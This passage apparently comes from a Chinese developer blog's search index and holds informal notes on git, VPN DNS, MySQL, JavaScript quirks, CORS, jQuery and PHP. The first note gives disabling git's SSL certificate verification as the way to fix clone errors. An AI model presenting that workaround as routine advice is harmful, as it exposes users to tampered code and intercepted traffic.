","date":"2019-03-16","objectID":"/blog/posts/git%E4%B8%8D%E8%83%BDclone%E4%B8%8B%E4%BE%86%E7%9A%84%E5%95%8F%E9%A1%8C/:1:1","tags":["git"],"title":"git不能clone下來的問題","uri":"/blog/posts/git%E4%B8%8D%E8%83%BDclone%E4%B8%8B%E4%BE%86%E7%9A%84%E5%95%8F%E9%A1%8C/"},{"categories":["Git"],"content":"設定當下不檢查 SSL 方法 原本想說看有沒有暫時的語法 後來找到這個 1.创建临时环境变量： windows上命令行输入： set GIT_SSL_NO_VERIFY=true git clone Linux下： env GIT_SSL_NO_VERIFY=true git push 但我的 window 的 git bash 上面指令都不管用 不過我後來找到一篇用 export GIT_SSL_NO_VERIFY=1 可以解決 执行 Git 命令时出现各种 SSL certificate problem 的解决办法 - officercat 的专栏 - CSDN 博客 git - How do I set GIT_SSL_NO_VERIFY for specific repos only? - Stack Overflow Git ssl error on windows - Stack Overflow ","date":"2019-03-16","objectID":"/blog/posts/git%E4%B8%8D%E8%83%BDclone%E4%B8%8B%E4%BE%86%E7%9A%84%E5%95%8F%E9%A1%8C/:1:2","tags":["git"],"title":"git不能clone下來的問題","uri":"/blog/posts/git%E4%B8%8D%E8%83%BDclone%E4%B8%8B%E4%BE%86%E7%9A%84%E5%95%8F%E9%A1%8C/"},{"categories":["Git"],"content":"改成 SSL 方法也能解決這個問題 另外，還有一種方法就是改成用 ssh 方法 git clone 也能解決這個問題 ","date":"2019-03-16","objectID":"/blog/posts/git%E4%B8%8D%E8%83%BDclone%E4%B8%8B%E4%BE%86%E7%9A%84%E5%95%8F%E9%A1%8C/:1:3","tags":["git"],"title":"git不能clone下來的問題","uri":"/blog/posts/git%E4%B8%8D%E8%83%BDclone%E4%B8%8B%E4%BE%86%E7%9A%84%E5%95%8F%E9%A1%8C/"},{"categories":null,"content":"最近連到 VPN，有同事反應連不到內網的 gitlab 由於我們 MIS 有改 Gitlab 網址(原本是 IP) 改成網址(git.xxx.com.tw) 但是連 VPN 後怎麼連不到 由於我有一個朋友是做網路的 所以有問他這個問題 當你連 VPN 的時候，可能對方會重新寫入你的路由設定 DNS 也會被改變(本次的地雷) Linux 看路由方法 \u003e ip route show default dev ppp0 scope link default via 192.168.1.1 dev wlp3s0 proto dhcp metric 600 168.95.xxx.xxx dev ppp0 proto kernel scope link src 118.x.xx.xxx 169.x.0.0/16 dev wlp3s0 scope link metric 1000 172.17.0.0/16 dev docker0 proto kernel scope link src 172.17.0.1 192.168.1.0/24 dev wlp3s0 proto kernel scope link src 192.168.1.121 metric 600 window 看路由方法 \u003e route print IPv4 路由表 =========================================================================== 使用中的路由: 網路目的地 網路遮罩 閘道 介面 計量 0.0.0.0 0.0.0.0 192.168.1.1 192.168.1.111 35 0.0.0.0 0.0.0.0 6.0.0.1 6.1.1.1 5025 6.0.0.0 255.0.0.0 在連結上 6.1.1.1 281 6.1.1.1 255.255.255.255 在連結上 6.1.1.1 281 6.255.255.255 255.255.255.255 在連結上 6.1.1.1 281 10.10.1.0 255.255.255.0 在連結上 10.10.1.1 291 連 VPN 我看了一下結果，VPN 並非把所有 IP 都做 defualt gateway 他很明確把10.10.xx.xx那些 IP 導向那邊去 所以我在 VPN 就連192.168.x.x(gitlab IP 位置) 空白網頁(網址有導向 git.xxxx.com.tw) 這時候我懷疑了 DNS DNS 看了一下 果然連 VPN 的時候跟沒連的 DNS 位置不一樣 然後過幾天，副理出國遠端電腦發現不能連 git 也是一樣的問題 XDD 寫一篇筆記，留意這個問題 網路小筆記 一般設定 GateWay IP，通常設定固定 IP 的時候，可能會不知道這是幹什麼用？ 但是今天問同學，他有簡單說明這個用途 之前想說沒輸入這個應該可有可無也可以連 發送 IP 的時候，我們電腦在不同網域的時候 已定要送到 gateway 不然不同網域誰知道要往哪裡送出 所以我以前電腦就算沒有設定 gateway 連相同網段也不會有問題 相同網段可能不需要找吧(XD 不確定) 簡單有問同學，直接連別台 PC 電腦，那是不是也可以做一樣的事情 我同學說可以。恍然大悟，原來 gateway 設定對網路這一快也是很重要 今天又學到一個重要的知識!!! nslookup 查詢 dns 解析方法 server dns PChome Online - 股市 ","date":"2019-03-14","objectID":"/blog/posts/VPN%E5%BE%8C%E5%B0%8E%E7%BD%AEDNS%E6%94%B9%E8%AE%8A%E7%84%A1%E6%B3%95%E9%80%A3%E5%88%B0%E5%85%A7%E7%B6%B2%E7%B6%B2%E5%9D%80/:0:0","tags":null,"title":"VPN後導置DNS改變無法連到內網網址","uri":"/blog/posts/VPN%E5%BE%8C%E5%B0%8E%E7%BD%AEDNS%E6%94%B9%E8%AE%8A%E7%84%A1%E6%B3%95%E9%80%A3%E5%88%B0%E5%85%A7%E7%B6%B2%E7%B6%B2%E5%9D%80/"},{"categories":["SQL"],"content":"最近用 MySQL 做浮點數運算 PHP 程式輸出竟然有123.30000 後來網路上有看到解法 正確的解決方式： select 0+cast(90.09008700 as char ) 輸出結果 90.090087 或者 select 0+CONVERT(‘90.09008700‘ , CHAR) 輸出結果：90.090087 參考內容: mysql 之處理金錢小數點後的多余 0 - IT 閱讀 SQL 中如何去掉 decimal 字段後面的 0 - donnie88888888 的专栏 - CSDN 博客 ","date":"2019-03-13","objectID":"/blog/posts/MySQL%E6%B5%AE%E9%BB%9E%E6%95%B8%E9%81%8B%E7%AE%97%E8%A7%A3%E6%B1%BA%E8%BC%B8%E5%87%BA%E5%88%B0%E7%A8%8B%E5%BC%8F%E5%BE%8C%E9%9D%A2%E5%B0%BE%E6%95%B8%E6%9C%890%E7%9A%84%E6%96%B9%E6%B3%95/:0:0","tags":["sql","mysql","zero"],"title":"MySQL浮點數運算，解決輸出到程式後面尾數有0的方法","uri":"/blog/posts/MySQL%E6%B5%AE%E9%BB%9E%E6%95%B8%E9%81%8B%E7%AE%97%E8%A7%A3%E6%B1%BA%E8%BC%B8%E5%87%BA%E5%88%B0%E7%A8%8B%E5%BC%8F%E5%BE%8C%E9%9D%A2%E5%B0%BE%E6%95%B8%E6%9C%890%E7%9A%84%E6%96%B9%E6%B3%95/"},{"categories":null,"content":"最近想用 js 去做運算 發現使用 reduce 做物件院算發生問題 有爬文找到方法 這邊簡單做紀錄 this.filterData..reduce( (a , b )=\u003e Number(a.total) + Number(b.total) ).toFixed(4); 當初沒有仔細看 reduce 文件 當第一次進去 reduce 代的參數都會帶入 1,2 位置 第一圈可能會沒問題，但是第二圈a不是物件，是第一圈 return 的值 所以程式都會有問題 改要怎麼解決這個問題 有找到兩個解法 functional programming - Javascript reduce on array of objects - Stack Overflow 上手使用 JavaScript 的 Map、Reduce 吧！ reduce 第二個參數，是 intial value，放入的時候第一個a會代 0進去 所以後面不會錯 另一個方法是用 map 來整理資料，在做 reduce 第二種會比較舒服 this.filterData .map(v =\u003e Number(v.total)) .reduce((a, b) =\u003e a + b) .toFixed(4); this.filterData.reduce((a, { total }) =\u003e a + +total, 0).toFixed(4); 如何在 Array.forEach 的循环里 break js 中proto和 prototype 的区别和关系？ - 知乎 ","date":"2019-03-13","objectID":"/blog/posts/js%E5%81%9A%E7%89%A9%E4%BB%B6reduce%E9%81%8B%E7%AE%97%E6%8A%80%E5%B7%A7-map-reduce/:0:0","tags":null,"title":"js做物件reduce運算技巧(map,reduce)","uri":"/blog/posts/js%E5%81%9A%E7%89%A9%E4%BB%B6reduce%E9%81%8B%E7%AE%97%E6%8A%80%E5%B7%A7-map-reduce/"},{"categories":null,"content":"由於今天上課 簡單小記今天上課我覺得記不住，但是該紀錄的筆記 有可能會記入錯誤 所以算是我的觀點 有錯不要怪我喔!!有錯不要怪我喔!!有錯不要怪我喔!! 想真的了解 JS，可以自己 Google 一下核心部分課程 應該也只有一個人教(就不打廣告了) 這邊是我的筆記(我覺得重要的) 變數是指標，指向記憶體中的資料 宣告變數var的同時，也會成為某物件下的屬性 (不一定是根物件,ex:function) 屬性可以用 delete 刪除，`變數無法被刪除 var 在一般外面 function 宣告，會寫在 window function 寫在 ao 物件ECMA-262 Javascript 核心 Number.prototype.name = \"Hello\"; var a = 1; console.log(a.name); // 'Hello' number 祖先關係，原型 delete a.name; // ture 刪一個不存在地方，會回傳 true \\*這一點真的會讓人家以為有刪除成功 a.name; //Hello var 與 let 的範圍 JavaScript 裡的型別 原始型別 number string boolean null undefined symbol 物件型別 原始型別 屬性不可添加(但可以擺繼承 interface[string,number…]) 物件型別 可以擴充屬性 這邊也有提到重點前端工程研究：關於 JavaScript 中物件的 valueOf 方法 | The Will Will Web 注意 sort 排序竟然是依照 toString 去做(我還沒有遇到這個雷…) 如何判斷數字排序呢? Array.prototype.sort() - JavaScript | MDN var numbers = [4, 2, 5, 1, 3]; numbers.sort(function(a, b) { return a - b; }); 小記 sort * 若 compareFunction(a, b) 的回傳值小於 0，則會把 a 排在小於 b 之索引的位置，即 a 排在 b 前面。 * 若 compareFunction(a, b) 回傳 0，則 a 與 b 皆不會改變彼此的順序，但會與其他全部的元素比較來排序。備註：ECMAscript 標準並不保證這個行為，因此不是所有瀏覽器（如 Mozilla 版本在 2003 以前）都遵守此行為。 * 若 compareFunction(a, b) 的回傳值大於 0，則會把 b 排在小於 a 之索引的位置，即 b 排在 a 前面。 * compareFunction(a, b) 在給予一組特定元素 a 及 b 為此函數之兩引數時必須總是回傳相同的值。若回傳值不一致，排序順序則為 undefined。(看不懂這還意義，但好像undefined會移到最後面去) [sorting - javascript array.sort with undefined values - Stack Overflow](https://stackoverflow.com/questions/4783242/javascript-array-sort-with-undefined-values) 簡單來說 a,b回傳小於 0 的時候，不會調整；反之，a,b回傳大於 0 的時候，會調整位置成b,a 原始型別包裹物件 需要用 new(沒加 new 是轉型) 包裹物件可以改裡面屬性 var numObj = 17; numObj.xxx = \"2\"; console.log(numObj); // undefined var numObj = new Number(\"17\"); numObj.xxx = \"2\"; console.log(numObj); // 2 var s = \"Hello\"; s[0] = \"J\"; console.log(); Number VS parseInt() Number(1)是轉型，這跟 parseInt 很像，但細部內容不一樣 Number(\"1abc\"); // NaN parseInt(\"1abc\", 10); // 1 之前公司都是用 parseInt(xxx)轉型，公司的老鳥有說過後面要加第二個參數比較好parseInt(xxx,10) 但是轉型的話還是用 Number 比較好 數字運算需要注意的事情 0.1 + 0.2 != 0.3 =\u003e true (0.5).toString(2); // 0.1 (0.25).toString(2); //0.01 (0.125).toString(2); //0.001 0.300000000000004 (0.1).toString(2) // 0.0001100110011001100110011001100110011001100110011001101 (0.2).toString(2) // 0.001100110011001100110011001100110011001100110011001101 所以正常要做大數字的運算還是需要用到別的寫好的 js BigInt 目前只有 chrome 支援 NULL 要注意的事情 typeof null // object null 只能跟 null 與 undefined 比較 NaN 跟任何物件比較都是 false 所以平常typeof a這段沒辦法知道 a 變數是不是物件(因為也有可能是 null) typeof(a) == 'object' \u0026\u0026 a!== null 完整判斷寫法 undefined IE8 的 bug var undefined = 33; console.log(window.undefined); var a; // 33 (chrome,firefox,IE\u003e=9是undefined) jQuery 處理 undefined 被修改問題(IE8 的 bug) (function(jQuery, undefined) { ...; window.jQuery = window.$ = this; })(jQuery); 關於 Date 字串格式 GMT 注意問題 new Date(\"2019-01-01\"); // 正規ISO時間，所以是用ISO時間 new Date(\"2019/01/01\"); // 非正規ISO時間，所以是用本地時間 前端工程研究：關於 JavaScript 中 Date 型別的常見地雷與建議作法 | The Will Will Web JavaScript 物件資料結構 物件回收 當 delete 掉屬性，沒相連跟物件就會被 gc 回收 以瀏覽器的 js 為例，所有的頭都是 window 物件，當 window 屬性與變數 delete 掉時，將會自動回收 (這一點感覺就跟 git 很像，只是 git 的 commit 上面沒有 branch 時候之後會自動被回收) hoisting 會做 hoisting 有 function a(){ xxxx} var a = 1;，var 開頭的 但是var a = function(){xxxx}，不會做 hoisting console.log(a); //undefined var a = 1; 程式會變成 var a; console.log(a); //undefined a = 1; function a() { var test = function() { console.log(1); }; function test() { console.log(2); } test(); } a(); 同等於 function a() { var test; function test() { console.log(2); } test = function() { console.log(1); }; test(); } a(); ** let 區域變數在的時候，不會受到 hoisting 影響 ** let 生命週期是在{}裡面，這邊跟 Java 一樣 在宣告時候之前出現變數，是不允許的，就算上{}有 var 變數，也不會顯示出來(這部份看下面範例，很容易忽略) var a = 1; console.log(a); // 1 if (true) { //這邊因為let關係，所以抓不到外面的var，這一點要注意!!!很容易不小心忽略這個特性 console.log(a); // can't access lexical declaration let a = 2; console.log(a); // 2 } console.log(a); // 1 簡稱 ESM(ECMAScript Module) 不管各模組間寫了幾次 import，只會 import 一次， 主模組呼叫 A.js B.js C.js 但是A.js有呼叫B.js 所以B.js指呼叫一次，不會重新載入 可變的寫法 var a = []; var b = a; a.push(1); console.log(a); //[1] console.log(b); //[1] 不可變的寫法 var a = []; var b = a; a = [...a, 1]; // 重新宣告變數，陣列內的 ...a 變數指向原本變數的 console.log(a); //[] console.log(b); //","date":"2019-03-10","objectID":"/blog/posts/%E6%88%91%E7%9A%84JavaScript%E7%AD%86%E8%A8%98/:0:0","tags":null,"title":"我的JavaScript筆記","uri":"/blog/posts/%E6%88%91%E7%9A%84JavaScript%E7%AD%86%E8%A8%98/"},{"categories":["JavaScript"],"content":"雖然平常沒有使用 CORS 但是之前有嘗試了解 CORS 流程原理 其實瀏覽器會先送 OPTIONS 封包做確認 有做跨域 header 東西，就會傳送資訊 今天突然想到傳送兩次 不是會做兩次程式東西 我稍微爬了一下文章 原來我想的問題真的是有這個問題 看到這篇CORS 跨域原理浅析 - 知乎 備份圖 裡面有提到很多很細的內容 我自己也有用簡單 PHP 測試 \u003c?php header(\"Access-Control-Allow-Origin: *\"); header(\"Access-Control-Allow-Headers: *\"); echo 'work!' . PHP_EOL; $fp = fopen('test.txt','a+'); fwrite($fp,'1'. PHP_EOL); fclose($fp); echo 'finial' . PHP_EOL; 簡單用php -s 0.0.0.0:8888就可以啟動 php 簡易 server 在隨便網頁開啟開發者工具，可以fetch('http://localhost:8888/test.php') 可以看test.txt有幾個 1 就知道執行幾次 雖然平常沒甚麼機會使用 CORS，但是還是紀錄這個容易忽略的事情 話說 Laravel 好像也要注意怎麼修改 相關連結: 輕鬆理解 Ajax 與跨來源請求 | TechBridge 技術共筆部落格 CORS 跨域原理浅析 - 知乎 Laravel 处理 OPTIONS 请求的原理探索及 \u0008 批量处理方案 - 知乎 PHP, Larave, Nginx 設置 Header 允許請求 CORS 的幾種方式 « 關於網路那些事… ✋🏼🔥 CS Visualized: CORS - DEV Community ","date":"2019-03-07","objectID":"/blog/posts/CORS%E5%AF%A6%E4%BD%9C%E5%8F%AF%E8%83%BD%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85/:0:0","tags":["cors","ajax"],"title":"CORS實作可能要注意的事情","uri":"/blog/posts/CORS%E5%AF%A6%E4%BD%9C%E5%8F%AF%E8%83%BD%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85/"},{"categories":["JavaScript"],"content":"之前Bootstrap 不知道 Modal 一些事筆記 | 程式狂想筆記有紀錄 jquery load 事情 但是今天看到還有更神奇的load 以前沒甚麼用到這個函式 不過覺得在單一網頁不要讓頁面複雜的時候 可以使用這個方法切出 component 不過剛開始看 load，想說是單純.html( data )載入 看是看了一下文件，功能比我想像的還多 超乎我的想像 所以就心虛寫這篇，虧我寫 jQuery 那麼久都不知道有那麼強大的功能 orz ","date":"2019-03-06","objectID":"/blog/posts/jQuery%E5%BF%AB%E9%80%9F%E6%96%B9%E4%BE%BF%E8%BC%89%E5%85%A5-load-%E6%96%B9%E6%B3%95/:0:0","tags":["jquery","load"],"title":"jQuery快速方便載入(load)方法","uri":"/blog/posts/jQuery%E5%BF%AB%E9%80%9F%E6%96%B9%E4%BE%BF%E8%BC%89%E5%85%A5-load-%E6%96%B9%E6%B3%95/"},{"categories":["JavaScript"],"content":"一般使用 load $(\"#result\").load(\"ajax/test.html\"); 內容會載入到 選擇器上面。 後面可以放 callback，完成的時候會執行 備註:此方法會載入 css,js 網頁所有內容 $(\"#result\").load(\"ajax/test.html\", function() { alert(\"Load was performed.\"); }); ","date":"2019-03-06","objectID":"/blog/posts/jQuery%E5%BF%AB%E9%80%9F%E6%96%B9%E4%BE%BF%E8%BC%89%E5%85%A5-load-%E6%96%B9%E6%B3%95/:1:0","tags":["jquery","load"],"title":"jQuery快速方便載入(load)方法","uri":"/blog/posts/jQuery%E5%BF%AB%E9%80%9F%E6%96%B9%E4%BE%BF%E8%BC%89%E5%85%A5-load-%E6%96%B9%E6%B3%95/"},{"categories":["JavaScript"],"content":"load 可以指定網頁內容 #div(Loading Page Fragments) $(\"#result\").load(\"ajax/test.html #container\"); 這算是我讓我驚訝的功能，而且不會載入 ajax 裡面頁面html,body,script裡面內容 備註:此方法會不會載入 css,js 網頁所有內容 這是出乎意料的事情 可以在 jQuery 官網jQuery API Documentation 開起開發者工具來看， 這段 js,css 都會重新載入 $(\"body\").load(\"/\"); 下面這段 js,css 都不會重新載入 $(\"body\").load(\"/ #global-nav\"); 不管寫在 body 後面，或者#global-nav都不會執行 但對於後面綁定可能真的要寫在 callback 那邊了 ","date":"2019-03-06","objectID":"/blog/posts/jQuery%E5%BF%AB%E9%80%9F%E6%96%B9%E4%BE%BF%E8%BC%89%E5%85%A5-load-%E6%96%B9%E6%B3%95/:2:0","tags":["jquery","load"],"title":"jQuery快速方便載入(load)方法","uri":"/blog/posts/jQuery%E5%BF%AB%E9%80%9F%E6%96%B9%E4%BE%BF%E8%BC%89%E5%85%A5-load-%E6%96%B9%E6%B3%95/"},{"categories":["JavaScript"],"content":"load 可帶參數 post 內容 這個就太簡單了，直接複製官網文件內容 Example: 發送數組形式的 data 參數到服務器。 $(\"#objectID\").load(\"test.php\", { \"choices[]\": [\"Jon\", \"Susan\"] }); Example: Same as above, but will POST the additional parameters to the server and a callback that is executed when the server is finished responding. $(\"#feeds\").load(\"feeds.php\", { limit: 25 }, function() { alert(\"The last 25 entries in the feed have been loaded\"); }); .load() : 从服务器载入数据并且将返回的 HTML 代码并插入至 匹配的元素 中。 - jQuery API 中文文档 | jQuery 中文网 ","date":"2019-03-06","objectID":"/blog/posts/jQuery%E5%BF%AB%E9%80%9F%E6%96%B9%E4%BE%BF%E8%BC%89%E5%85%A5-load-%E6%96%B9%E6%B3%95/:3:0","tags":["jquery","load"],"title":"jQuery快速方便載入(load)方法","uri":"/blog/posts/jQuery%E5%BF%AB%E9%80%9F%E6%96%B9%E4%BE%BF%E8%BC%89%E5%85%A5-load-%E6%96%B9%E6%B3%95/"},{"categories":["JavaScript"],"content":"最近看到 jQuery 有beforeSend 看到這個可以做驗證上面 或著動態載入特效 先來筆記，感覺很容易忘記 \u003cform method=\"post\" action=\"test.php\"\u003e AA：\u003cinput type=\"text\" name=\"aa\" onkeypress=\"if (event.keyCode == 13) {return false;}\"\u003e \u003cinput type=\"radio\" name=\"cc\"\u003eCC \u003c/form\u003e XYZ 的筆記本: HTML form 只有一個 text input 時，在 input 上按 enter 會自動送出表單 之前公司也是用這個解法 但是我覺得這個方法寫在 html 真的很長 有想到一個方法 $(\"input\").on(\"keypress\", e =\u003e e.preventDefault()); ajax 搭配 submit 事件，實做 ajax 後，下面回傳 false，所以表單不會送出去 beforeSend可以做驗證動作 這時候還會有 input 按 Enter 會送出的問題 EX: $('form').on('submit',function(){ $.ajax({ url: '.', data:{ ... }, beforeSend: function(){ ... } }) return false; }); 由於暫存筆記有記錄 jquery.form.js 但是一直沒有記錄，趁著這個時間趕快記錄 $(\"#myForm\").ajaxForm(function() { $(\"#output1\") .html(\"提交成功！欢迎下次再来！\") .show(); }); $(\"#myForm2\").submit(function() { $(this).ajaxSubmit(function() { $(\"#output2\") .html(\"提交成功！欢迎下次再来！\") .show(); }); return false; //阻止表单默认提交 }); 淺談 jquery.form.js 的 ajaxSubmit 和 ajaxForm 的使用 | 程式前沿 簡單來說ajaxForm和ajaxSubmit看起來很像 但簡單來說ajaxForm是拿當下 form 做 submit 時候，不會送出去，會做 ajax 這就是跟一般 ajax 差別 ajaxSubmit是當下呼叫拿當下 form 做 ajax 動作 所以上面範例是寫在.submit()裡面 ajax 拿來放在 submit 可以簡單做到表單綁定效果 以下是筆記暫存就放在下面 怕沒有甚麼機會寫到 # JQuery Form Validate [使用jQuery.form庫中ajaxSubmit提交表單時遇到的一些問題 - 掃文資訊](https://hk.saowen.com/a/e36ca7b7b772fcc2699400c165fb9129964364e45217a35412ca0cdb21b37b63) https://jqueryvalidation.org/documentation/ http://formvalidation.io/examples/ [Bootstrap 表單驗證formValidation 之表單動態驗證 - CSDN博客](https://blog.csdn.net/u012123026/article/details/53288641) [Bootstrap 表单验证formValidation 之表单动态添加元素之后再次验证 - CSDN博客](https://blog.csdn.net/weixin_40475396/article/details/79879094) jQuery Form [jQuery Form Plugin中AjaxForm与AjaxSubmit的区别-飘一代-51CTO博客](http://blog.51cto.com/fluagen/393134) 把傳統表單迅速套成ajaxForm，submit可以做成ajax動作 # waitme # ajaxsuccess [Ajax-Global Ajax Event Handlers .ajaxComplete()、.ajaxError()、.ajaxSend()、.ajaxStart()、.ajaxStop()、.ajaxSuccess() | 阿沙布魯 - 點部落](https://dotblogs.com.tw/brooke/2016/07/10/142933) 可搭配waitme實做 參考來源: [程式][JQuery] 讓 AJAX 運作的時候，跳出 loding 的訊息。－Part 1 @ 四處流浪的阿基。I am Vagrant Walker :: 痞客邦 :: jquery-form/form: jQuery Form Plugin jQuery Form Plugin 中 AjaxForm 与 AjaxSubmit 的区别-飘一代-51CTO 博客 jQuery form 插件的使用–ajaxForm()和 ajaxSubmit()的可选参数项对象 - souvc - 博客园 防止 ENTER 鍵直接 SUBMIT- 藍色小舖 BlueShop HTML 防止 input 回车提交表单 - 李刚的学习专栏 - CSDN 博客 XYZ 的筆記本: HTML form 只有一個 text input 時，在 input 上按 enter 會自動送出表單 Press Enter to Submit 背后的那些事 « David Chen’s Blog JS Bin - JS Bin ","date":"2019-03-05","objectID":"/blog/posts/jQuery-ajax%E7%9A%84beforeSend%E5%A6%99%E7%94%A8/:0:0","tags":["jquery","javascript","ajax"],"title":"jQuery ajax的beforeSend妙用","uri":"/blog/posts/jQuery-ajax%E7%9A%84beforeSend%E5%A6%99%E7%94%A8/"},{"categories":["CSS"],"content":"這篇簡單記錄focus-within 簡單記錄一下這邊 主要會監聽子層 focus，子層會冒泡給上層 上層會觸發 focus-within 簡單玩一下會比較了解JS Bin - JS Bin 更多內容可以看 神奇的選擇器 :focus-within - WEB 前端 - 伯樂在線 ","date":"2019-02-28","objectID":"/blog/posts/%E7%A5%9E%E5%A5%87%E7%9A%84%E9%81%B8%E6%93%87%E5%99%A8-focus-within/:0:0","tags":["css"],"title":"神奇的選擇器 :focus-within","uri":"/blog/posts/%E7%A5%9E%E5%A5%87%E7%9A%84%E9%81%B8%E6%93%87%E5%99%A8-focus-within/"},{"categories":["HTML"],"content":"正常 focus 只有 input,textarea,button 等等 平常 div 是沒有 focus，但最近看focus-within有一個案例 神奇的选择器 :focus-within - WEB 前端 - 伯乐在线 Off-screen nav with :focus-within [PURE CSS] 查了一下是 tabindex 關係 由於這個很少用，所以還是記錄一下。 说说 tabindex 的那些事儿 | bubkoo 備份圖 定義和用法 tabindex 屬性規定元素的 tab 鍵控制次序（當 tab 鍵用於導航時）。 提示和註釋 註釋：以下元素支持 tabindex 屬性：\u003ca\u003e, \u003carea\u003e, \u003cbutton\u003e, \u003cinput\u003e, \u003cobject\u003e, \u003cselect\u003e 以及 \u003ctextarea\u003e。 HTML tabindex 属性 (译)如何让 div 可以有 focus 事件? div 或 span 設定 tabindex 就會有 focus 最後剛好最近在查有沒有按鍵盤切換方向鍵移動不同 table 的 input 剛好有看到 garygreen/arrow-table: Navigate HTML tables with arrow keys (jQuery plugin) jQuery-利用上下左右鍵移動輸入焦點-黑暗執行緒 由於是上面是用 tabindex 去實作 真想把他改成文字用左再調整更換 input 位置 javascript 对象之 selectionStart selectionEnd - 选择了就坚持 - 博客园 Cross browser Javascript code to get/set caret position in textarea/input function getCaretPosition(ctrl) { // IE \u003c 9 Support if (document.selection) { ctrl.focus(); var range = document.selection.createRange(); var rangelen = range.text.length; range.moveStart(\"character\", -ctrl.value.length); var start = range.text.length - rangelen; return { start: start, end: start + rangelen }; } // IE \u003e=9 and other browsers else if (ctrl.selectionStart || ctrl.selectionStart == \"0\") { return { start: ctrl.selectionStart, end: ctrl.selectionEnd }; } else { return { start: 0, end: 0 }; } } function setCaretPosition(ctrl, start, end) { // IE \u003e= 9 and other browsers if (ctrl.setSelectionRange) { ctrl.focus(); ctrl.setSelectionRange(start, end); } // IE \u003c 9 else if (ctrl.createTextRange) { var range = ctrl.createTextRange(); range.collapse(true); range.moveEnd(\"character\", end); range.moveStart(\"character\", start); range.select(); } } 先留著…以後再修改 ","date":"2019-02-27","objectID":"/blog/posts/%E5%A6%82%E4%BD%95%E8%AE%93div%E6%9C%89focus%E5%8B%95%E4%BD%9C-tabindex/:0:0","tags":["tabindex","html"],"title":"如何讓div有focus動作(tabindex)","uri":"/blog/posts/%E5%A6%82%E4%BD%95%E8%AE%93div%E6%9C%89focus%E5%8B%95%E4%BD%9C-tabindex/"},{"categories":["HTML"],"content":"之前很常看到網頁做不做跳頁超連結都用href=\"#\" 也有看過更早的程式用javascript:void(0); 但也沒有深入這兩個的差別 當然知道#有錨點功能，但說真的也不知道這樣用會有什麼缺點 神奇的 html 錨點，讓你的網頁在內部自由的跳轉 - 每日頭條 之前有看過一篇在 Angular 套版時應注意多層次選單超連結的使用 | The Will Will Web 今天就小記一下，不然怕之忘了很難找 ","date":"2019-02-27","objectID":"/blog/posts/%E8%B6%85%E9%80%A3%E7%B5%90href-%E5%92%8Chref-javascript-void-0-%E5%B7%AE%E5%88%A5-href%E5%92%8Csrc%E4%B8%8D%E4%B8%80%E6%A8%A3%E7%9A%84%E5%9C%B0%E6%96%B9/:0:0","tags":["href","src"],"title":"超連結href=#和href=javascript:void(0)差別 \u0026 href和src不一樣的地方","uri":"/blog/posts/%E8%B6%85%E9%80%A3%E7%B5%90href-%E5%92%8Chref-javascript-void-0-%E5%B7%AE%E5%88%A5-href%E5%92%8Csrc%E4%B8%8D%E4%B8%80%E6%A8%A3%E7%9A%84%E5%9C%B0%E6%96%B9/"},{"categories":["HTML"],"content":"href,javascript:void(0),javascript:; 我們一般比較常見的寫法有幾種： 直接使用 # 當作超連結 這種技巧對於靜態版型還可行，許多網頁設計師也很習慣這樣寫，但是當使用者點擊連結後，卻會在目前網址後方加上一個 # 符號。一來，我個人相當不喜歡這種作法，因為網址會發生改變；二來，這種寫法會讓 SPA (單一頁面應用程式) 的路由發生異常，所以應該避免。 使用特殊的 javascript:void(0) 當作超連結 這種寫法通常是前端工程師以及對 UX 特別要求的設計師愛用，原因無他，就是網址列不會出現怪怪的 # 符號。這種寫法同時也對 SPA 網頁應用程式相當友善，所以推薦使用。但唯一的缺點，就是比 # 多打太多字了！ 使用特殊的 javascript:; 當作超連結 這種寫法跟 javascript:void(0) 如出一轍，但硬是少打了 6 個字元，如果學會他，你這輩子可能有機會打超過 1000 次這種連結，就可以少打 6000 個按鍵，不無小補啦。 以上來自:在 Angular 套版時應注意多層次選單超連結的使用 | The Will Will Web ","date":"2019-02-27","objectID":"/blog/posts/%E8%B6%85%E9%80%A3%E7%B5%90href-%E5%92%8Chref-javascript-void-0-%E5%B7%AE%E5%88%A5-href%E5%92%8Csrc%E4%B8%8D%E4%B8%80%E6%A8%A3%E7%9A%84%E5%9C%B0%E6%96%B9/:1:0","tags":["href","src"],"title":"超連結href=#和href=javascript:void(0)差別 \u0026 href和src不一樣的地方","uri":"/blog/posts/%E8%B6%85%E9%80%A3%E7%B5%90href-%E5%92%8Chref-javascript-void-0-%E5%B7%AE%E5%88%A5-href%E5%92%8Csrc%E4%B8%8D%E4%B8%80%E6%A8%A3%E7%9A%84%E5%9C%B0%E6%96%B9/"},{"categories":["HTML"],"content":"src href 這之前也有看過類似文章 但今天忘了，剛好又看到有人討論這個問題 當出學 HTML 也是用記得，沒有想到這個問題 六角學院 - 學員社團 html - Difference between SRC and HREF - Stack Overflow 另外依據文內資訊，在載入頁面時，此兩者個運作行為會有差別。 具體而言，瀏覽器會依據 html 的內容依序載入元素，由於 src 本身即為元素之一，因此瀏覽器會等 src 的內容完整抓取之後才繼續載入後續元素。然而 href 只是連結，瀏覽器並不會去載入 href 的任何內容。 這就是爲什麼 CSS 是用 href，但是 javascript 卻是用 src ","date":"2019-02-27","objectID":"/blog/posts/%E8%B6%85%E9%80%A3%E7%B5%90href-%E5%92%8Chref-javascript-void-0-%E5%B7%AE%E5%88%A5-href%E5%92%8Csrc%E4%B8%8D%E4%B8%80%E6%A8%A3%E7%9A%84%E5%9C%B0%E6%96%B9/:2:0","tags":["href","src"],"title":"超連結href=#和href=javascript:void(0)差別 \u0026 href和src不一樣的地方","uri":"/blog/posts/%E8%B6%85%E9%80%A3%E7%B5%90href-%E5%92%8Chref-javascript-void-0-%E5%B7%AE%E5%88%A5-href%E5%92%8Csrc%E4%B8%8D%E4%B8%80%E6%A8%A3%E7%9A%84%E5%9C%B0%E6%96%B9/"},{"categories":["PHP"],"content":"最近寫 PHP 使用 intval()做字串轉數值 之前有看到一篇文章，PHP 也有轉型(int)'134' 這兩個有沒有差別，當下我也不知道 只是intval()看起來很順眼 所以選擇這個方法 但我最近在 Google 搜尋 發現我錯了 For years I've been using intval($var) for being sure something is an integer, and sometimes using (int)$var to cast it into an integer, which essentially does the same thing — learn what casting is. I'm here to tell you that unless you require the second parameter of intval(), which changes the base, then you should be casting instead. In the case of casting int, it's about 300% or 3 times as fast as using intval(), and if you use it a lot like I do, for example in setting the correct type/checking for SQL queries, then it's time to switch. I know I am. Casting int faster than intval in 